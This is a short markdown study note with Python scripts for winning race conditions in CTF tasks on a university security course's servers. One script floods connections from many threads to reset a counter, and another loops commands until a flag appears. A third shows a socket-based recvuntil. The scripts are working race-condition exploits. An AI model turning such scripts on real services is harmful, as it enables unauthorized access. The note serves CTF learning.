# Race condition

### Create socket with python directly (practice-5)
```
import socket

with socket.create_connection(('tasks.ws24.softsec.rub.de', 33269)) as so:
    while True:
        so.sendall(b'vuln\n')
        potential_flag = so.recv(1024)
        if b'softsec{' in potential_flag:
            print(potential_flag)
            break

        so.sendall(b'/flag\n')
        so.recv(1024)
```


### Create multiple threads (30 santa)
- here is use pwntools send function, but threading
```python
import pwn
import threading

pwn.context.arch = 'amd64'

# 1) docker compose -f debug.yml up

# a new instance sets count to zero
def spawn_new():
    while(True):
        new_conn = pwn.remote('tasks.ws24.softsec.rub.de', 32984, level='error')
        #new_conn = pwn.remote('127.0.0.1', 1024, level='error')
        new_conn.close()

# if count = 0 when we check, we win
def send_naughty():
    conn_naughty = pwn.remote('tasks.ws24.softsec.rub.de', 32984, level='error')
    #conn_naughty = pwn.remote('127.0.0.1', 1024, level='error')
    while(True):
        conn_naughty.sendlineafter(b'> ', b'Get presents')
        potential_flag = conn_naughty.recvline()
        if b'softsec' in potential_flag:
            print(potential_flag)
            break

# set count to zero often
for _ in range(15):
    t = threading.Thread(target=spawn_new)
    t.start()

# try to win
t4 = threading.Thread(target=send_naughty)
t4.start()
t4.join()
```


### Implement recvuntil using socket
- pwntools recvuntil is too slow for race conditions
- unlike pwntools' recvline, recv will read up to (but probably fewer than) the specified number of bytes, and stop when there is no more data to read currently. If you're waiting on a response from the server, that will typically be the data from a single write on the server side. This means that sometimes you will get more than one line in a single recv, and sometimes you may need multiple recv calls to receive the entire repsonse from the server. In general, you can implement pwntools' recvuntil by receiving data in a loop until the separator shows up (though this means you may have additional data that you didn't want to process yet, etc.). Mostly, the server should behave consistently, so once you figured out where the data you want from a recv is, you should be able to just grab it.
```python
import socket

# Open the connection. The `with` part means that the socket will
# close automatically when you leave the scope
with socket.create_connection(('example.com', 80)) as so:
    # Send some data, and make sure that it all arrives
    so.sendall(b'HEAD / HTTP/1.1\r\nHost: example.com\r\n\r\n')

    # Read until we see the end of the headers (CRLF x2)
    response = b''
    while b'\r\n\r\n' not in response:
        # Receive _up to 1024 bytes_ (from a single server write)
        response += so.recv(1024)

    # Process the response somehow
    assert response.endswith(b'\r\n\r\n'), 'Unexpected data after headers'
    print(response.decode())
```
